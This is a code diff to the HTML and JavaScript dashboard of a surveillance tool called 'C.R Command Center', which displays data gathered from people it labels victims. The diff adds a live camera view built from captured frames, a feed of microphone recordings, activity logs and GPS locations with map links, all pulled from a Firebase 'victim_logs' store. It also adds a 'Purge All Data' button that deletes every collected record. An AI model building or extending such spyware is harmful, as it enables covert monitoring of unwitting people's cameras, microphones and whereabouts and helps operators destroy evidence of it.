@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>C.R Monitoring V1.1 - Advanced</title>
+    <title>C.R Monitoring V1.2 - Live Stream</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
         body { background-color: #050505; color: #00ff00; font-family: 'Courier New', Courier, monospace; }
@@ -12,6 +12,10 @@
         .victim-card:hover { border-color: #ff0000; }
         .tab-btn { padding: 10px; border-bottom: 2px solid transparent; cursor: pointer; }
         .tab-btn.active { border-color: #ff0000; color: #ff0000; }
+        .purge-btn { background: #440000; color: #ff0000; border: 1px solid #ff0000; transition: 0.3s; }
+        .purge-btn:hover { background: #ff0000; color: #fff; box-shadow: 0 0 15px #ff0000; }
+        .live-indicator { animation: blink 1s infinite; color: red; font-weight: bold; }
+        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0; } 100% { opacity: 1; } }
     </style>
 </head>
 <body class="p-4">
@@ -19,63 +23,74 @@
         <header class="flex justify-between items-center border-b border-green-900 pb-4 mb-6">
             <div>
                 <h1 class="text-3xl font-bold uppercase tracking-widest text-red-600">C.R COMMAND CENTER</h1>
-                <p class="text-xs text-gray-500">PROTOTYPE V1.1 | OWNER: GIGS | STATUS: <span class="animate-ping">●</span> ONLINE</p>
+                <p class="text-xs text-gray-500">PROTOTYPE V1.2 | OWNER: GIGS | STATUS: <span class="animate-ping">●</span> ONLINE</p>
             </div>
-            <div id="auth-info" class="text-right text-[10px] text-gray-400">Connecting to C.R Core...</div>
+            <div class="flex flex-col items-end">
+                <button id="purge-all" class="purge-btn px-4 py-2 text-xs font-bold rounded mb-2 uppercase">Purge All Data</button>
+                <div id="auth-info" class="text-[10px] text-gray-400">Connecting...</div>
+            </div>
         </header>
 
         <div class="grid grid-cols-1 lg:grid-cols-4 gap-6">
-            <!-- Sidebar: Victim List -->
             <div class="lg:col-span-1 border-r border-green-900 pr-4">
                 <h2 class="text-lg font-bold mb-4 border-b border-green-900">VICTIM LIST</h2>
-                <div id="victim-list" class="space-y-2 max-h-[70vh] overflow-y-auto">
-                    <!-- List victims here -->
-                </div>
+                <div id="victim-list" class="space-y-2 max-h-[70vh] overflow-y-auto"></div>
             </div>
 
-            <!-- Main Panel: Data Display -->
             <div class="lg:col-span-3">
                 <div class="flex space-x-4 mb-4 border-b border-gray-800">
-                    <div class="tab-btn active" id="tab-log">ACTIVITY LOGS</div>
-                    <div class="tab-btn" id="tab-media">MEDIA & MIC</div>
+                    <div class="tab-btn active" id="tab-live">LIVE CAMERA</div>
+                    <div class="tab-btn" id="tab-log">ACTIVITY LOGS</div>
                     <div class="tab-btn" id="tab-geo">GEOLOCATION</div>
                 </div>
 
-                <div id="content-log" class="space-y-4">
-                    <div id="logs-container"></div>
+                <!-- Live Stream Panel -->
+                <div id="content-live" class="space-y-4">
+                    <div class="glitch-border p-4 bg-black">
+                        <div class="flex justify-between items-center mb-2">
+                            <h3 class="text-red-500 font-bold uppercase">Target View: <span id="target-id">None</span></h3>
+                            <span class="live-indicator" id="live-status">● DISCONNECTED</span>
+                        </div>
+                        <div id="live-display" class="w-full aspect-video bg-gray-900 flex items-center justify-center border border-red-900 overflow-hidden relative">
+                            <img id="stream-img" src="" class="w-full h-full object-contain hidden">
+                            <span id="stream-placeholder" class="text-gray-700">Waiting for live feed...</span>
+                            <div class="absolute top-2 left-2 bg-black bg-opacity-50 p-1 text-[10px] text-white" id="stream-ts"></div>
+                        </div>
+                        <div class="mt-4">
+                            <h3 class="text-blue-500 mb-2 font-bold">LATEST AUDIO LOGS</h3>
+                            <div id="audio-container" class="grid grid-cols-1 gap-2 max-h-40 overflow-y-auto"></div>
+                        </div>
+                    </div>
                 </div>
 
-                <div id="content-media" class="hidden grid grid-cols-1 md:grid-cols-2 gap-4">
-                    <div class="glitch-border p-4">
-                        <h3 class="text-red-500 mb-2 underline font-bold">LATEST PHOTO</h3>
-                        <div id="photo-display" class="w-full aspect-video bg-black flex items-center justify-center border border-gray-800">
-                            <span class="text-gray-700">No Image Captured</span>
-                        </div>
-                    </div>
-                    <div class="glitch-border p-4">
-                        <h3 class="text-blue-500 mb-2 underline font-bold">AUDIO STREAM</h3>
-                        <div id="audio-container" class="space-y-2">
-                             <span class="text-gray-700 italic">Waiting for mic activation...</span>
-                        </div>
-                    </div>
+                <div id="content-log" class="hidden space-y-2">
+                    <div id="logs-container" class="max-h-[60vh] overflow-y-auto"></div>
                 </div>
 
                 <div id="content-geo" class="hidden">
                     <div id="map-info" class="glitch-border p-4 bg-black min-h-[300px]">
-                        <p class="text-yellow-500">COORD: <span id="lat-long">0.0, 0.0</span></p>
-                        <p class="text-white">MAP LINK: <a id="map-link" href="#" target="_blank" class="text-blue-400 underline italic">Open in Google Maps</a></p>
-                        <div class="mt-4 border border-gray-800 p-2 text-xs text-gray-500">
-                            Peta statis tidak tersedia tanpa API Key Map. Klik link di atas untuk navigasi.
-                        </div>
+                        <p class="text-yellow-500 font-bold">COORD: <span id="lat-long">0.0, 0.0</span></p>
+                        <p class="text-white mt-2">MAP LINK: <a id="map-link" href="#" target="_blank" class="text-blue-400 underline italic">Open Google Maps</a></p>
                     </div>
                 </div>
             </div>
         </div>
     </div>
 
+    <div id="confirm-modal" class="fixed inset-0 bg-black bg-opacity-90 z-50 hidden flex items-center justify-center">
+        <div class="border border-red-500 p-8 bg-black max-w-sm text-center">
+            <h2 class="text-red-500 text-2xl font-bold mb-4">DANGER ZONE</h2>
+            <p class="text-white mb-6">Hapus semua data permanen?</p>
+            <div class="flex space-x-4 justify-center">
+                <button id="cancel-purge" class="px-6 py-2 border border-gray-500 text-gray-500">BATAL</button>
+                <button id="confirm-purge" class="px-6 py-2 bg-red-600 text-white font-bold">YA, BERSIHKAN!</button>
+            </div>
+        </div>
+    </div>
+
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-app.js";
-        import { getFirestore, collection, onSnapshot, query, orderBy } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-firestore.js";
+        import { getFirestore, collection, onSnapshot, getDocs, deleteDoc, doc, query, orderBy, limit } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-firestore.js";
         import { getAuth, signInAnonymously, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-auth.js";
 
         const firebaseConfig = {
@@ -102,49 +117,65 @@
             }
         });
 
-        // Tab Switching Logic
         document.querySelectorAll('.tab-btn').forEach(btn => {
             btn.addEventListener('click', () => {
                 document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
                 btn.classList.add('active');
                 const target = btn.id.replace('tab-', 'content-');
-                ['content-log', 'content-media', 'content-geo'].forEach(id => {
+                ['content-live', 'content-log', 'content-geo'].forEach(id => {
                     document.getElementById(id).classList.toggle('hidden', id !== target);
                 });
             });
         });
 
+        document.getElementById('purge-all').onclick = () => document.getElementById('confirm-modal').classList.remove('hidden');
+        document.getElementById('cancel-purge').onclick = () => document.getElementById('confirm-modal').classList.add('hidden');
+        
+        document.getElementById('confirm-purge').onclick = async () => {
+            const logsRef = collection(db, 'artifacts', appId, 'public', 'data', 'victim_logs');
+            const snapshot = await getDocs(logsRef);
+            snapshot.forEach(d => deleteDoc(doc(db, 'artifacts', appId, 'public', 'data', 'victim_logs', d.id)));
+            location.reload();
+        };
+
         function initApp() {
             const logsRef = collection(db, 'artifacts', appId, 'public', 'data', 'victim_logs');
+            
             onSnapshot(logsRef, (snap) => {
-                const container = document.getElementById('logs-container');
-                const list = document.getElementById('victim-list');
-                container.innerHTML = '';
-                list.innerHTML = '';
+                const logCont = document.getElementById('logs-container');
+                const vicList = document.getElementById('victim-list');
+                const streamImg = document.getElementById('stream-img');
+                const streamPlace = document.getElementById('stream-placeholder');
+                
+                logCont.innerHTML = '';
+                vicList.innerHTML = '';
 
-                snap.forEach(doc => {
-                    const data = doc.data();
-                    // Update Logs
-                    const log = document.createElement('div');
-                    log.className = 'victim-card p-3 mb-2 text-xs';
-                    log.innerHTML = `[${new Date(data.timestamp).toLocaleTimeString()}] IP: ${data.ip || '??'} - Action: ${data.action}`;
-                    container.prepend(log);
+                snap.forEach(docSnap => {
+                    const data = docSnap.data();
+                    
+                    // Simple Log
+                    const div = document.createElement('div');
+                    div.className = 'victim-card p-2 mb-1 text-[10px]';
+                    div.innerText = `[${new Date(data.timestamp).toLocaleTimeString()}] ${data.action}`;
+                    logCont.prepend(div);
 
-                    // Update Media if exists
-                    if(data.action === "CAPTURED_MEDIA") {
-                        if(data.photo) {
-                            document.getElementById('photo-display').innerHTML = `<img src="${data.photo}" class="max-h-full">`;
-                        }
-                        if(data.audio) {
-                            const audioHtml = `<div class="bg-gray-900 p-2 rounded flex items-center space-x-2">
-                                <span class="text-xs">REC ${new Date(data.timestamp).toLocaleTimeString()}</span>
-                                <audio controls src="${data.audio}" class="h-8"></audio>
-                            </div>`;
-                            document.getElementById('audio-container').innerHTML = audioHtml + document.getElementById('audio-container').innerHTML;
-                        }
+                    // Live Stream Update (Always show latest photo/frame)
+                    if(data.action === "LIVE_FRAME" || data.photo) {
+                        const imgData = data.frame || data.photo;
+                        streamImg.src = imgData;
+                        streamImg.classList.remove('hidden');
+                        streamPlace.classList.add('hidden');
+                        document.getElementById('target-id').innerText = data.uid.substring(0,8);
+                        document.getElementById('live-status').innerText = "● LIVE";
+                        document.getElementById('stream-ts').innerText = new Date(data.timestamp).toLocaleString();
                     }
 
-                    // Update Geo
+                    if(data.audio) {
+                        const aud = document.createElement('audio');
+                        aud.controls = true; aud.src = data.audio; aud.className = "h-8 w-full mt-1";
+                        document.getElementById('audio-container').prepend(aud);
+                    }
+
                     if(data.location) {
                         document.getElementById('lat-long').innerText = `${data.location.lat}, ${data.location.lng}`;
                         document.getElementById('map-link').href = `https://www.google.com/maps?q=${data.location.lat},${data.location.lng}`;
